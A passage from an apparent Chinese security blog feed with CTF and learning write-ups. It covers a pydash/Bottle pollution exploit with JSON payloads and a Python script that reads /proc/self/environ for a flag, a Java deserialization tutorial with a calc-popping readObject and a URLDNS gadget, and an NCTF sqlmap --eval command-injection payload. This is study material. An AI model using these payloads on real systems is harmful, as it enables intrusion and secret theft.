env.get,</span><br><span class="line">        <span class="string">&#x27;setdefault&#x27;</span>: env.setdefault,</span><br><span class="line">        <span class="string">&#x27;defined&#x27;</span>: env.__contains__</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">exec</span>(<span class="variable language_">self</span>.co, env)</span><br><span class="line">    <span class="keyword">if</span> env.get(<span class="string">&#x27;_rebase&#x27;</span>):</span><br><span class="line">        subtpl, rargs = env.pop(<span class="string">&#x27;_rebase&#x27;</span>)</span><br><span class="line">        rargs[<span class="string">&#x27;base&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(_stdout)  <span class="comment">#copy stdout</span></span><br><span class="line">        <span class="keyword">del</span> _stdout[:]  <span class="comment"># clear stdout</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._include(env, subtpl, **rargs)</span><br><span class="line">    <span class="keyword">return</span> env</span><br></pre></td></tr></table></figure><p>可以看到这里构建了<code>env</code>环境，然后在<code>exec</code>中调用了执行预编译的模板也就是<code>self.co</code>，如果这里调用了rebase方法，就会递归的去调用父模板。之后会读取<code>test</code>文件的内容，然后在<code>render</code>中返回解析的内容。</p><p><img src="/img/pydash-set-chain-contamination/image-20250408171306505.png" alt="image-20250408171306505"></p><p>到这里我们就分析完了整个利用链。整理一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">template:adapter()-&gt;<span class="keyword">class</span>:BaseTemplate:search()-&gt;<span class="keyword">class</span>:SimpleTemplate:prepare()-&gt;render()-&gt;<span class="built_in">exec</span>()-&gt;stdout</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>那么利用的思路就很简单了，我们希望读取environ文件，只需要通过<code>set_</code>方法修改<code>TEMPLATE_PATH</code>即可结合黑名单，payload如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//POST传参</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;../../../../../proc/self/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">//GET传参：</span></span><br><span class="line">name=setval</span><br></pre></td></tr></table></figure><p>但是<code>pydash</code>不允许修改<code>__globasl__</code>的属性，声明在<code>helpers.py</code>文件中。</p><p><img src="/img/pydash-set-chain-contamination/image-20250408172553144.png" alt="image-20250408172553144"></p><p>所以我们还要先污染一下<code>RESTRICTED_KEYS</code></p><p>payload如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//POST传参</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;[]&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">//GET传参</span></span><br><span class="line">name=pydash</span><br></pre></td></tr></table></figure><p>我们可以得到如下python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line">payload_1 = <span class="string">&#x27;&#123;&quot;path&quot;:&quot;helpers.RESTRICTED_KEYS&quot;,&quot;value&quot;:&quot;[]&quot;&#125;&#x27;</span></span><br><span class="line">payload_2 = <span class="string">&#x27;&#123;&quot;path&quot;:&quot;__globals__.bottle.TEMPLATE_PATH&quot;,&quot;value&quot;:[&quot;../../../../../proc/self/&quot;]&#125;&#x27;</span></span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;url:&quot;</span>)</span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">r = requests.post(url + <span class="string">&quot;/setValue?name=pydash&quot;</span>,headers=headers, data=payload_1)</span><br><span class="line">r = requests.post(url + <span class="string">&quot;/setValue?name=setval&quot;</span>,headers=headers, data=payload_2)</span><br><span class="line">r = requests.get(url + <span class="string">&quot;/render?path=environ&quot;</span>)</span><br><span class="line">response = r.text</span><br><span class="line">flag = re.search(<span class="string">r&#x27;flag\&#123;.*?\&#125;&#x27;</span>, response)</span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag found:&quot;</span>, flag.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag not found!&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化-01</title>
      <link href="/2025/04/01/JavaSerialization01/"/>
      <url>/2025/04/01/JavaSerialization01/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在这篇文章之前，我已经学习了有关fastjson的Java反序列化，但是在最近的比赛中考察到了Java原生反序列化的知识点，初步了解之后发现两者相距甚远，所以决定写下这篇这篇文章，记录一下Java反序列化的学习。虽然Java原生的反序列化已经十分少见，但是毕竟是网络安全，可以不用，不能不会，所以还是深入研究一下。</p><h2 id="序列化与反序列化的代码实现"><a href="#序列化与反序列化的代码实现" class="headerlink" title="序列化与反序列化的代码实现"></a>序列化与反序列化的代码实现</h2><p>有关于序列化和反序列化的知识点这里不做赘述，个人建议从PHP开始了解序列化与反序列化，因为PHP的序列化更加简单些，这里贴出之前所写的文章链接，供师傅们学习：</p><p><a href="https://blog.csdn.net/2301_79629995/article/details/142713714?spm=1001.2014.3001.5501">序列化与反序列化基础及反序列化漏洞(附案例)_反序列化漏洞代码-CSDN博客</a></p><p>还是先创建一个Java项目，创建一个类文件，键入如下代码。</p><h3 id="Person-java"><a href="#Person-java" class="headerlink" title="Person.java"></a>Person.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再创建一个类文件，键入如下代码，该代码为序列化代码：</p><h3 id="SerializationTest-java"><a href="#SerializationTest-java" class="headerlink" title="SerializationTest.java"></a>SerializationTest.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后创建一个反序列化文件：</p><h3 id="UnserializeTest-java"><a href="#UnserializeTest-java" class="headerlink" title="UnserializeTest.java"></a>UnserializeTest.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h3><p><img src="/img/JavaSerialization01/image-20250330163748907.png" alt="image-20250330163748907"></p><p><img src="/img/JavaSerialization01/image-20250330163758818.png" alt="image-20250330163758818"></p><p>我们都知道，序列化的目的在于数据的传输。</p><p>在序列化的代码中，我们将序列化功能封装进入<code>serialize</code>方法中，我们通过<code>FileOutputStream</code>输出流，将序列化对象输出到<code>ser.bin</code>文件中，在通过<code>oss</code>的<code>writeObject</code>方法，对对象进行序列化操作。</p><p>在反序列化的代码中，我们将反序列化功能封装进入<code>unserialize</code>方法中，我们通过<code>FileInputStream</code>输入流，将序列化后的对象中<code>ser.bin</code>，文件中读取出来，再通过<code>obj</code>的<code>readObject</code>方法，对对象进行反序列化操作。</p><p>对于Java中的一些反序列化的特性，这里不做赘述，需要的师傅可以前往<a href="https://www.freebuf.com/articles/web/333697.html">第一篇参考文献</a>中了解。</p><h2 id="序列化与反序列化的安全问题"><a href="#序列化与反序列化的安全问题" class="headerlink" title="序列化与反序列化的安全问题"></a>序列化与反序列化的安全问题</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>在Java的序列化和反序列化中，有两个重要的方法，<code>readObject</code>和<code>writeObject</code>。这两个方法可以由开发者重写，一般来说，重写这两个方法存在于下面这种场景：</p><blockquote><p>在一个类中，存在一个数组属性：array，初始化的数组长度为100。在实际的序列化过程中，假设让array参加序列化过程，那么长度为100的数组都会被序列化，而实际使用的可能不足30个，这显然是不合理的，所以这里就需要自定义序列化和反序列化的过程。具体做法就是重写<code>readObject</code>和<code>writeObject</code>方法。</p></blockquote><p>综上所述，当服务端反序列化数据时，对应类中的readObject方法就会自动执行。所以<strong>反序列化产生危害的根本在于<code>readObejct</code>方法</strong></p><h3 id="漏洞形式"><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a>漏洞形式</h3><h4 id="一个简单的示例"><a href="#一个简单的示例" class="headerlink" title="一个简单的示例"></a>一个简单的示例</h4><p>这种形式在实际生产中其实并不常见，我们写一段弹出计算器的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException&#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化一下，再反序列化一下，就可以直接弹出计算器了。这是最理想的情况，实战中很少会出现这种情况</p><h4 id="URLDNS-Gadget"><a href="#URLDNS-Gadget" class="headerlink" title="URLDNS Gadget"></a>URLDNS Gadget</h4><p><strong>URLDNS</strong> 是 Java 反序列化漏洞中最经典、最简单的利用链之一，通常用于检测目标是否存在反序列化漏洞（因为它不会执行恶意代码，而是触发一次 DNS 请求）。它主要依赖 <code>HashMap</code> 和 <code>URL</code> 类的特性，结合 <code>hashCode()</code> 方法在反序列化时的自动调用机制。</p><h5 id="URLDNS-Gadget-的核心原理"><a href="#URLDNS-Gadget-的核心原理" class="headerlink" title="URLDNS Gadget 的核心原理"></a>URLDNS Gadget 的核心原理</h5><h6 id="利用链组成"><a href="#利用链组成" class="headerlink" title="利用链组成"></a>利用链组成</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() </span><br><span class="line">    -&gt; HashMap.putVal() </span><br><span class="line">        -&gt; HashMap.hash() </span><br><span class="line">            -&gt; URL.hashCode() </span><br><span class="line">                -&gt; URLStreamHandler.hashCode() </span><br><span class="line">                    -&gt; URL.getHostAddress() </span><br><span class="line">                        -&gt; InetAddress.getByName() </span><br><span class="line">                            -&gt; DNS 查询</span><br></pre></td></tr></table></figure><h6 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h6><blockquote><ul><li><strong><code>HashMap</code> 反序列化时会计算 <code>hashCode</code></strong><br>当 <code>HashMap</code> 被反序列化时，会调用 <code>readObject()</code>，进而调用 <code>hash()</code> 方法计算每个键（Key）的哈希值，触发 <code>key.hashCode()</code>。</li><li><strong><code>URL</code> 类的 <code>hashCode()</code> 会触发 DNS 查询</strong><br><code>URL.hashCode()</code> 默认调用 <code>URLStreamHandler.hashCode()</code>，而该方法会调用 <code>URL.getHostAddress()</code>，最终执行 <code>InetAddress.getByName(host)</code>，向目标域名发起 DNS 请求。</li></ul></blockquote><h6 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h6><p>根据描述，我们有如下示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://ybjhvjpune.dgrh3.cn&quot;</span>);</span><br><span class="line">        <span class="comment">// 构造 HashMap，使 URL 作为 Key</span></span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 修改 URL 的 hashCode 计算方式，避免 put 时提前触发 DNS</span></span><br><span class="line">        <span class="comment">// （反射修改 URL#hashCode 为 -1，使其在反序列化时重新计算）</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodeField</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCodeField.set(url, -<span class="number">1</span>);  <span class="comment">// 确保 put 时不触发 DNS</span></span><br><span class="line">        <span class="comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性</span></span><br><span class="line">        serialize(hashCodeField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们跟进<code>HashMap</code>这个类，找到其中的<code>readObject</code>这个方法。</p><p><img src="/img/JavaSerialization01/image-20250401162627771.png" alt="image-20250401162627771"></p><p>我们发现这里调用了<code>hash</code>这个方法，跟进<code>hash</code>。</p><p><img src="/img/JavaSerialization01/image-20250401162654339.png" alt="image-20250401162654339"></p><p>又发现这里调用了传入的对象<code>key</code>的<code>hashCode</code>的方法。根据上面的跟踪，我们知道当进行反序列化时，<code>readObject</code>这个方法会调用<code>HashMap</code>中的所有对象的<code>hashCode</code>方法。接下来我们回到一开始，去跟踪<code>URL</code>这个类中的<code>hashCode</code>方法。</p><p><img src="/img/JavaSerialization01/image-20250401163018582.png" alt="image-20250401163018582"></p><p>跟进我们发现，这里调用了<code>handler</code>这个对象的中的<code>hashCode</code>方法，<code>hanlder</code>又属于<code>URLStreamHandler</code>这个类。继续跟进<code>URLStreamHandler</code>这个类的<code>hashCode</code>方法。</p><p><img src="/img/JavaSerialization01/image-20250401163217979.png" alt="image-20250401163217979"></p><p>我们关注其中的<code>getHostAddress</code>方法。</p><p><img src="/img/JavaSerialization01/image-20250401163345449.png" alt="image-20250401163345449"></p><p>最后到这里，触发DNS请求。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.freebuf.com/articles/web/333697.html">Java反序列化基础篇-01-反序列化概念与利用 - FreeBuf网络安全行业门户</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Serialization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024-nctf 个人WP</title>
      <link href="/2025/03/23/2024-nctf/"/>
      <url>/2025/03/23/2024-nctf/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlmap-master"><a href="#sqlmap-master" class="headerlink" title="sqlmap-master"></a>sqlmap-master</h2><p><img src="/img/2024-nctf/image-20250323221544863-1742745223472-1-1742745242081-17.png" alt="image-20250323221544863"></p><p>​访问环境后发现这是一个sqlmap的web服务，传入127.0.0.1后可见执行了sqlmap命令，尝试输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; <span class="built_in">whoami</span> &amp;&amp;</span><br></pre></td></tr></table></figure><p>​发现未能注入命令，分析源码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">    process = subprocess.Popen(</span><br><span class="line">        command.split(),</span><br><span class="line">        stdout=subprocess.PIPE,</span><br><span class="line">        stderr=subprocess.STDOUT,</span><br><span class="line">        shell=<span class="literal">False</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>​发现执行命令的这个方法，把传入的命令分割了，且<code>shell=False</code>，所以这里的<code>&amp;</code>不会被当作bash的特殊字符，而会被当作传参传入，所以注入失败了。这里我们就得转变方向了，尝试寻找有没有可能利用sqlmap本身的参数。</p><p><img src="/img/2024-nctf/image-20250323222129996-1742745223473-3-1742745242081-19.png" alt="image-20250323222129996"></p><p>​我们发现这里有一个eval参数可以执行任意的python代码，所以我们可以构造如下参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 --<span class="built_in">eval</span> <span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;echo$IFS<span class="variable">$FLAG</span>&gt;&gt;test&#x27;)&quot;</span>)</span><br><span class="line"><span class="comment">#因为&#x27; &#x27;会被作为分隔符，所以需要绕一下，其中，$IFS 替代 &#x27; &#x27;</span></span><br></pre></td></tr></table></figure><p>​我们就可以输出$FLAG变量到同目录的test文件中。</p><p><img src="/img/2024-nctf/image-20250323222657311-1742745223473-4-1742745242081-20.png" alt="image-20250323222657311"></p><p>​好的我们现在已经写好了文件，那么我们怎么读取文件？</p><p><img src="/img/2024-nctf/image-20250323222528181-1742745223473-2-1742745242081-18.png" alt="image-20250323222528181"></p><p>​我们可以利用这个参数，他会在文件内容不合法时，将文件的第一行输出出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 -c <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="/img/2024-nctf/image-20250323222631576-1742745223473-5-1742745242081-21.png" alt="image-20250323222631576"></p><p>​我们就得到flag了。</p><h2 id="ez-dash"><a href="#ez-dash" class="headerlink" title="ez_dash"></a>ez_dash</h2><p><img src="/img/2024-nctf/image-20250323222816552-1742745223473-6-1742745242081-22.png" alt="image-20250323222816552"></p><p>​访问环境后发现提示404，我们审计一下源码，发现有两个路由。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span 